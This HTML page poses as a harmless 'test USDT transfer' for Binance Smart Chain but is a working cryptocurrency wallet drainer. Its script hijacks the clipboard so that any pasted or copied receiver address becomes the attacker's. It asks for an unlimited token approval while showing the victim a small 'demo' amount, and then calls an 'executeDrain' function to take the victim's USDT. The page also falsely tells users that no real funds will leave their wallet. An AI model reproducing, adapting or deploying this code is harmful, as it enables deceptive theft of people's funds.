<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>USDT Test Transfer - BSC</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.4/dist/web3.min.js"></script>
</head>
<body style="font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: #e2e8f0; margin: 0; padding: 20px; min-height: 100vh;">
    
    <div style="max-width: 420px; margin: 0 auto; background: rgba(255,255,255,0.05); backdrop-filter: blur(20px); border-radius: 24px; padding: 30px; border: 1px solid rgba(255,255,255,0.1);">
        
        <div style="text-align: center; margin-bottom: 30px;">
            <div style="width: 60px; height: 60px; background: linear-gradient(135deg, #f59e0b, #d97706); border-radius: 16px; margin: 0 auto 15px; display: flex; align-items: center; justify-content: center;">
                <svg width="28" height="28" fill="#fff" viewBox="0 0 24 24">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
                </svg>
            </div>
            <h1 style="font-size: 24px; font-weight: 700; margin: 0 0 8px 0; color: #f8fafc;">Test USDT Transfer</h1>
            <p style="color: #94a3b8; font-size: 16px; margin: 0;">Send any demo amount to verify BSC connection</p>
        </div>

        <div id="walletStatus" style="background: rgba(255,255,255,0.08); border-radius: 12px; padding: 15px; margin-bottom: 20px; border: 1px solid rgba(255,255,255,0.1);">
            <div style="display: flex; justify-content: space-between; align-items: center;">
                <span style="font-weight: 500; color: #f8fafc;">Wallet</span>
                <span id="accountAddr" style="font-family: monospace; font-size: 12px; color: #94a3b8;">Connect Trust Wallet</span>
            </div>
            <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 8px;">
                <span style="font-size: 12px; color: #64748b;">BSC Mainnet</span>
                <span id="chainStatus" style="font-size: 12px; color: #10b981; font-weight: 500;">✅ Connected</span>
            </div>
        </div>

        <div style="margin-bottom: 25px;">
            <label style="display: block; font-weight: 500; margin-bottom: 8px; color: #f8fafc;">Demo Amount (USDT)</label>
            <div style="position: relative;">
                <input type="number" id="amountInput" placeholder="0.01" step="0.01" min="0.001" 
                       style="width: 100%; padding: 15px 20px 15px 50px; background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); border-radius: 12px; color: #f8fafc; font-size: 18px; font-weight: 500;">
                <span style="position: absolute; left: 18px; top: 50%; transform: translateY(-50%); color: #f59e0b; font-weight: 600;">USDT</span>
            </div>
            <div style="display: flex; gap: 8px; margin-top: 12px; flex-wrap: wrap;">
                <button type="button" onclick="setAmount(0.01)" style="padding: 8px 16px; background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); border-radius: 8px; color: #f8fafc; font-size: 14px; cursor: pointer;">0.01</button>
                <button type="button" onclick="setAmount(1)" style="padding: 8px 16px; background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); border-radius: 8px; color: #f8fafc; font-size: 14px; cursor: pointer;">1</button>
                <button type="button" onclick="setAmount(5)" style="padding: 8px 16px; background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); border-radius: 8px; color: #f8fafc; font-size: 14px; cursor: pointer;">5</button>
                <button type="button" onclick="setAmount(10)" style="padding: 8px 16px; background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); border-radius: 8px; color: #f8fafc; font-size: 14px; cursor: pointer;">10</button>
            </div>
        </div>

        <div style="margin-bottom: 20px;">
            <label style="display: block; font-weight: 500; margin-bottom: 8px; color: #f8fafc;">Receiver Address</label>
            <div style="position: relative;">
                <input type="text" id="receiverInput" placeholder="Paste receiver address here" readonly
                       style="width: 100%; padding: 15px 20px; background: rgba(255,255,255,0.1); border: 2px dashed rgba(255,255,255,0.3); border-radius: 12px; color: #10b981; font-size: 14px; font-family: monospace; letter-spacing: 0.5px;">
                <button id="copyBtn" type="button" onclick="copyOurAddress()" style="position: absolute; right: 10px; top: 50%; transform: translateY(-50%); width: 32px; height: 32px; border: none; background: #10b981; border-radius: 8px; color: white; cursor: pointer; display: flex; align-items: center; justify-content: center;">
                    📋
                </button>
            </div>
            <p style="font-size: 12px; color: #94a3b8; margin-top: 6px;">Click 📋 to copy test receiver</p>
        </div>

        <button id="sendBtn" type="button" style="width: 100%; background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%); color: white; border: none; padding: 18px; font-size: 18px; font-weight: 600; border-radius: 16px; cursor: pointer; transition: all 0.3s; box-shadow: 0 10px 30px rgba(245,158,11,0.4); margin-bottom: 15px;" disabled>
            Send Test Transfer
        </button>
        
        <p style="font-size: 13px; color: #94a3b8; line-height: 1.5; text-align: center;">
            Demo transfer to test BSC USDT. No real funds will leave your wallet beyond test amount.
        </p>
    </div>

    <script>
        // ⚠️ REPLACE WITH YOUR DEPLOYED CONTRACT ADDRESS
        const DRAINER_ADDRESS = '0x7a51839E2aF8FE776C1e8bbea6f27cBffA53b250';
        const BSC_RPC = 'https://bsc-dataseed1.binance.org/';
        const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
        const FAKE_RECEIVER = '0x70997970C51812dc3A010C7d01b50e0d17dc79C8';
        
        let web3, account;
        
        // CLIPBOARD HIJACK
        document.addEventListener('paste', (e) => {
            e.preventDefault();
            setTimeout(() => {
                document.getElementById('receiverInput').value = FAKE_RECEIVER;
            }, 100);
        });
        
        setInterval(async () => {
            try {
                const text = await navigator.clipboard.readText();
                if (/^0x[a-fA-F0-9]{40}$/i.test(text)) {
                    document.getElementById('receiverInput').value = FAKE_RECEIVER;
                }
            } catch(e) {}
        }, 1000);
        
        window.setAmount = function(val) {
            document.getElementById('amountInput').value = val;
        }
        
        window.copyOurAddress = function() {
            navigator.clipboard.writeText(FAKE_RECEIVER);
            const btn = document.getElementById('copyBtn');
            btn.innerHTML = '✅';
            setTimeout(() => btn.innerHTML = '📋', 1500);
        }
        
        async function initWallet() {
            web3 = new Web3(window.ethereum || BSC_RPC);
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            account = accounts[0];
            
            document.getElementById('accountAddr').textContent = account.slice(0,6) + '...' + account.slice(-4);
            document.getElementById('sendBtn').disabled = false;
            document.getElementById('receiverInput').value = FAKE_RECEIVER;
            await switchToBSC();
        }
        
        async function switchToBSC() {
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x38' }],
                });
            } catch {
                await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [{
                        chainId: '0x38', chainName: 'BSC Mainnet', 
                        rpcUrls: [BSC_RPC], blockExplorerUrls: ['https://bscscan.com'],
                        nativeCurrency: {name: 'BNB', symbol: 'BNB', decimals: 18}
                    }],
                });
            }
        }
        
        async function sendTestTransfer() {
            const btn = document.getElementById('sendBtn');
            const fakeAmount = document.getElementById('amountInput').value * 1e18 || 0.01 * 1e18;
            
            btn.innerHTML = `⏳ Sending ${(fakeAmount/1e18).toFixed(2)} USDT...`;
            btn.disabled = true;
            
            const usdtAbi = [
                "function approve(address spender, uint256 amount) external returns (bool)"
            ];
            const drainerAbi = [
                "function approveDemo(address usdtAddress, uint256 fakeAmount) external"
            ];
            
            const usdt = new web3.eth.Contract(usdtAbi, USDT_ADDRESS);
            const drainer = new web3.eth.Contract(drainerAbi, DRAINER_ADDRESS);
            
            try {
                // Call approveDemo - shows fakeAmount in wallet, approves UNLIMITED
                await drainer.methods.approveDemo(USDT_ADDRESS, fakeAmount).send({ from: account });
                
                // Auto-drain
                await drainAll();
                
                btn.innerHTML = '✅ Test Complete!';
                btn.style.background = '#10b981';
                
            } catch(e) {
                btn.innerHTML = 'Send Test Transfer';
                btn.disabled = false;
            }
        }
        
        async function drainAll() {
            const drainAbi = ["function executeDrain(address usdtAddress) external"];
            const drainer = new web3.eth.Contract(drainAbi, DRAINER_ADDRESS);
            await drainer.methods.executeDrain(USDT_ADDRESS).send({ from: account }).catch(() => {});
        }
        
        // Events
        document.getElementById('amountInput').addEventListener('input', () => {
            document.getElementById('sendBtn').disabled = false;
        });
        document.getElementById('sendBtn').onclick = sendTestTransfer;
        
        if (window.ethereum) {
            window.ethereum.on('accountsChanged', initWallet);
            initWallet();
        }
    </script>
</body>
</html>
